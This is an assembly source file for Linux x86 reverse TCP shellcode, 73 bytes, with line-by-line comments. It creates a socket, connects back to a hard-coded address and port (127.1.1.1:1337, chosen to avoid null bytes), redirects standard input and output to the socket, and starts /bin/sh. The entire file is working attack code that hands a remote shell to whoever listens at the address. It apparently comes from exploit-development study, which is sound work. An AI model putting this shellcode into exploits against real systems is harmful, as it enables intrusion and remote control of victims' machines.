; Filename: reverse-tcp.nasm
; Author:  Juanma Reyes
; Website:  jmreyes.net
;
; Purpose: Linux x86 Reverse TCP shellcode (73 bytes)

global _start			

section .text
_start:

	; Socket functions need to be called from SYS_SOCKETCALL (syscall 0x66)
	; int socketcall(int call, unsigned long *args);
	;
	; call - specific socket function to invoke
	; args - pointer to the arguments for that function
	

	; First, create a socket for communication by using the socket function
	; int socket(int domain, int type, int protocol);
	;
	; This function corresponds to SYS_SOCKET (0x01)

	push 0x66
	pop eax		; EAX = SYS_SOCKETCALL (0x66)

	; Set up the socket() arguments in the stack (note the reverse order)
	; Once finished, ESP will point to them.
	xor ebx, ebx
	push ebx	; protocol = IPPROTO_IP (0)
	; Next instruction is leveraged both to set EBX to its desired value
	; and to save one byte when setting up args (since push 0x01 would have
	; used 2 bytes)
	inc ebx		; EBX = SYS_SOCKET (1)
	push ebx	; type = SOCK_STREAM (1)
	push 0x02	; domain = AF_INET (2)
	mov ecx, esp	; ECX = *args

	int 0x80	; Exec syscall

	pop esi		; Store 0x02 in ESI temporarily
	xchg esi, eax	; Keep 0x02 in EAX, store syscall result descriptor in ESI

	; Connect the socket with the remote host
	; int connect(int socket, const struct sockaddr *address, socklen_t address_len);
	;
	; This function corresponds to SYS_CONNECT (0x03)

	mov al, 0x66	; EAX = SYS_SOCKETCALL (0x66)
	
	; http://www.retran.com/beej/sockaddr_inman.html
	; struct sockaddr_in {
    	; 	short            sin_family;   // e.g. AF_INET, AF_INET6
        ; 	unsigned short   sin_port;     // e.g. htons(3490)
	; 	struct in_addr   sin_addr;     // see struct in_addr, below
	;	char             sin_zero[8];  // zero this if you want to
	; };

	; Note the network byte order in the following instructions
	push 0x0101017f		; address.sin_addr.s_addr = 127.1.1.1 (avoid nulls)
	push word 0x3905	; address.sin_port = 1337
	inc ebx		
	push bx			; address.sin_family = AF_INET (2)
	mov ecx, esp		; (temporary) ECX -> pointer to the sockaddr_in
	
	inc ebx		; EBX = SYS_CONNECT(0x03)	

	push 0x10	; address_len = sizeof(sockaddr) = 16
	push ecx	; address -> pointer to the sockaddr_in
	push esi	; socket -> descriptor obtained from socket()
	mov ecx, esp	; ECX = *args

	int 0x80	; Exec syscall

	; Duplicate file descriptors to redirect stdin, stdout and stderr
	; int dup2(int fildes, int fildes2);
	;
	; This syscall's value is 63 (0x3f)

	pop ebx		; EBX = socket
	push 0x2
	pop ecx 	; ECX = 0x02 
loop:
	mov al, 0x3f	; EAX = SYS_DUP2 (0x3f)
	int 0x80
	dec ecx
	jns loop

	; Execute our program (/bin/sh)
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	;
	; This syscall's value is 11 (0x0b)
	
	mov al, 0x0b	; EAX = SYS_EXECVE (0x0b)
	
	xor edx, edx	; EDX = 0
	push edx
	pop ecx		; ECX = 0
	
	push ecx		; Push NULL string terminator
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "nib/"
	mov ebx, esp		; EBX : pointer to "/bin/sh//"

	int 0x80


